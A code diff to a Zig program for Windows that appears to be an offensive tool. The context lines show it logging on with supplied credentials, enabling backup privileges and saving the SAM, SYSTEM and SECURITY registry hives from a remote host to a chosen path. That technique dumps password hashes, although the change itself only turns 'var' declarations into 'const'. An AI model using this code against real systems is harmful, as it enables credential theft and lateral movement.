@@ -69,9 +69,9 @@ const Target = struct {
 
     pub fn authenticate(self: *Self) bool {
         // b/c zig is different and we need a cstr (null terminated)
-        var domain = std.fmt.allocPrintZ(self.allocator, "{s}", .{self.domain}) catch undefined;
-        var username = std.fmt.allocPrintZ(self.allocator, "{s}", .{self.username}) catch undefined;
-        var password = std.fmt.allocPrintZ(self.allocator, "{s}", .{self.password}) catch undefined;
+        const domain = std.fmt.allocPrintZ(self.allocator, "{s}", .{self.domain}) catch undefined;
+        const username = std.fmt.allocPrintZ(self.allocator, "{s}", .{self.username}) catch undefined;
+        const password = std.fmt.allocPrintZ(self.allocator, "{s}", .{self.password}) catch undefined;
 
         defer self.allocator.free(domain);
         defer self.allocator.free(username);
@@ -131,7 +131,7 @@ const Target = struct {
 
         if (token == undefined or token.? == win32.INVALID_HANDLE_VALUE) {
             // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess
-            var hProcess: ?win32.HANDLE = win32.GetCurrentProcess();
+            const hProcess: ?win32.HANDLE = win32.GetCurrentProcess();
 
             // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken
             if (0 == OpenProcessToken(
@@ -153,7 +153,7 @@ const Target = struct {
             @ptrFromInt(0), //                  [out, optional] PTOKEN_PRIVILEGES PreviousState,
             @ptrFromInt(0), //                  [out, optional] PDWORD            ReturnLength
         )) {
-            var result = GetLastError();
+            const result = GetLastError();
             if (result == @intFromEnum(win32.WIN32_ERROR.ERROR_INVALID_HANDLE)) {
                 std.log.err("[!] Failed AdjustTokenPrivileges - invalid handle :: error code ({d})", .{result});
             } else {
@@ -163,7 +163,7 @@ const Target = struct {
             return false;
         }
 
-        var result = GetLastError();
+        const result = GetLastError();
         if (result != 0) { // win32.WIN32_ERROR.ERROR_SUCCESS
 
             if (result == 1300) { // win32.WIN32_ERROR.ERROR_NOT_ALL_ASSIGNED
@@ -184,9 +184,9 @@ const Target = struct {
         var hive_key: ?win32.HKEY = undefined;
         var result: win32.WIN32_ERROR = win32.WIN32_ERROR.NO_ERROR;
 
-        var hives = [_][]const u8{ "SAM", "SYSTEM", "SECURITY" };
+        const hives = [_][]const u8{ "SAM", "SYSTEM", "SECURITY" };
 
-        var source = std.fmt.allocPrintZ(self.allocator, "\\\\{s}", .{self.source.?}) catch return false;
+        const source = std.fmt.allocPrintZ(self.allocator, "\\\\{s}", .{self.source.?}) catch return false;
         defer self.allocator.free(source);
 
         // https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regconnectregistrya
@@ -208,7 +208,7 @@ const Target = struct {
         for (hives) |h| {
             std.log.info("[+] Saving {s} hive to {s}\\{s}", .{ h, self.destination, h });
 
-            var hive = std.fmt.allocPrintZ(self.allocator, "{s}", .{h}) catch undefined;
+            const hive = std.fmt.allocPrintZ(self.allocator, "{s}", .{h}) catch undefined;
             defer self.allocator.free(hive);
 
             std.log.debug("[+] Calling RegOpenKeyExA(HKLM, {s}, BACKUP|LINK, ALL_ACCESS, hKey)", .{hive});
@@ -235,7 +235,7 @@ const Target = struct {
                 break;
             }
 
-            var destination = std.fmt.allocPrintZ(self.allocator, "{s}\\{s}", .{ self.destination, hive }) catch undefined;
+            const destination = std.fmt.allocPrintZ(self.allocator, "{s}\\{s}", .{ self.destination, hive }) catch undefined;
             defer self.allocator.free(destination);
 
             if (fileExists(destination)) {
@@ -306,9 +306,9 @@ const Target = struct {
     }
 
     pub fn parseTarget(self: *Self, line: []u8) !void {
-        var hasDomain = std.mem.containsAtLeast(u8, line, 1, "/");
-        var hasPassword = std.mem.containsAtLeast(u8, line, 1, ":");
-        var hasTarget = std.mem.containsAtLeast(u8, line, 1, "@");
+        const hasDomain = std.mem.containsAtLeast(u8, line, 1, "/");
+        const hasPassword = std.mem.containsAtLeast(u8, line, 1, ":");
+        const hasTarget = std.mem.containsAtLeast(u8, line, 1, "@");
 
         if (!hasDomain and !hasPassword and !hasTarget) {
             self.source = try self.allocator.alloc(u8, line.len);
